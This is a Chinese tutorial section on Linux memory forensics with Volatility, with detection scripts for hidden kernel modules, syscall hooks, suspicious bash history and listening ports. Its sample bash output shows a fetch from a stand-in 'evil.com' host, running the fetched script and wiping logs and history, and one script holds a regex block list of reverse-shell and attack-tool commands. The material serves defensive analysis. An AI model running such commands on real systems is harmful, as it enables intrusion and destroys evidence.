# Linux内存分析

### 5.1 内核模块分析

```bash
# 列出内核模块
vol -f memory.raw linux.check_modules

# 检测隐藏的内核模块
# Volatility会对比多种检测方法的结果
# 方法1：从模块链表获取（lsmod）
# 方法2：从内核内存扫描
# 方法3：从sysfs获取

# 列出内核模块
vol -f memory.raw linux.lsmod

# 检测Rootkit钩子
vol -f memory.raw linux.check_syscall
vol -f memory.raw linux.check_inline_kernel
```

**Linux内核模块检测脚本：**

```python
import subprocess
import re

class LinuxKernelAnalyzer:
    def __init__(self, memory_image):
        self.image = memory_image

    def check_modules(self):
        """检测隐藏的内核模块"""
        print("[*] Checking for hidden kernel modules...")

        # 获取模块列表
        result = subprocess.run(
            ['vol', '-f', self.image, 'linux.check_modules'],
            capture_output=True, text=True
        )

        # 分析输出
        for line in result.stdout.split('\n'):
            if 'Hidden' in line or 'Unknown' in line:
                print(f"[!] Suspicious module: {line.strip()}")
            elif line.strip():
                print(f"  {line.strip()}")

    def check_syscall_table(self):
        """检测系统调用表Hook"""
        print("\n[*] Checking syscall table for hooks...")

        result = subprocess.run(
            ['vol', '-f', self.image, 'linux.check_syscall'],
            capture_output=True, text=True
        )

        for line in result.stdout.split('\n'):
            if 'HOOKED' in line.upper() or 'MODIFIED' in line.upper():
                print(f"[!] Syscall hook detected: {line.strip()}")
            elif line.strip() and 'INDEX' not in line:
                print(f"  {line.strip()}")

    def analyze_kernel_modules(self):
        """完整内核分析"""
        self.check_modules()
        self.check_syscall_table()

if __name__ == "__main__":
    analyzer = LinuxKernelAnalyzer("memory.raw")
    analyzer.analyze_kernel_modules()
```

### 5.2 Bash历史

```bash
# 提取Bash历史命令
vol -f memory.raw linux.bash

# 输出示例：
# PID    Command
# 1234   cd /tmp
# 1234   wget http://evil.com/malware.sh
# 1234   chmod +x malware.sh
# 1234   ./malware.sh
# 1234   rm -rf /var/log/*
# 1234   history -c

# 提取特定进程的Bash历史
vol -f memory.raw linux.bash --pid 1234
```

### 5.3 进程信息

```bash
# 进程列表
vol -f memory.raw linux.pslist

# 进程树
vol -f memory.raw linux.pstree

# 进程打开的文件
vol -f memory.raw linux.lsof

# 进程内存映射
vol -f memory.raw linux.proc_maps --pid 1234

# 网络连接
vol -f memory.raw linux.netstat

# 进程环境变量
vol -f memory.raw linux.bash_env --pid 1234
```

**Linux进程分析脚本：**

```python
import subprocess
import re

class LinuxProcessAnalyzer:
    # 可疑命令模式
    SUSPICIOUS_COMMANDS = [
        r'wget\s+http', r'curl\s+http', r'nc\s+-', r'ncat',
        r'python\s+-c', r'perl\s+-e', r'bash\s+-i',
        r'/dev/tcp/', r'chmod\s+\+x', r'rm\s+-rf',
        r'history\s+-c', r'unset\s+HISTFILE',
        r'nmap\s+', r'hydra\s+', r'john\s+',
        r'msfconsole', r'sqlmap', r'nikto'
    ]

    def __init__(self, memory_image):
        self.image = memory_image

    def analyze_bash_history(self):
        """分析Bash历史"""
        result = subprocess.run(
            ['vol', '-f', self.image, 'linux.bash'],
            capture_output=True, text=True
        )

        suspicious = []
        for line in result.stdout.split('\n'):
            for pattern in self.SUSPICIOUS_COMMANDS:
                if re.search(pattern, line, re.IGNORECASE):
                    suspicious.append(line.strip())
                    break

        print(f"\n[*] Suspicious bash commands: {len(suspicious)}")
        for cmd in suspicious:
            print(f"  [!] {cmd}")

        return suspicious

    def check_network_connections(self):
        """检查网络连接"""
        result = subprocess.run(
            ['vol', '-f', self.image, 'linux.netstat'],
            capture_output=True, text=True
        )

        # 检查异常端口
        for line in result.stdout.split('\n'):
            if 'LISTEN' in line:
                parts = line.split()
                for part in parts:
                    if ':' in part:
                        port = part.split(':')[-1]
                        if port.isdigit():
                            p = int(port)
                            # 检查可疑端口
                            if p in {4444, 31337, 1234, 5555, 9999, 8888}:
                                print(f"  [!] Suspicious listening port: {p}")

    def analyze_all(self):
        """完整分析"""
        self.analyze_bash_history()
        self.check_network_connections()

if __name__ == "__main__":
    analyzer = LinuxProcessAnalyzer("memory.raw")
    analyzer.analyze_all()
```

---

---

## 📋 内容审核与补充建议

> 针对「Linux内存分析」部分的内容审核结果：

### 📚 知识点补充
- ⚠️ 缺少knowledge相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### ⚔️ 攻击技术
- ⚠️ 缺少attack相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
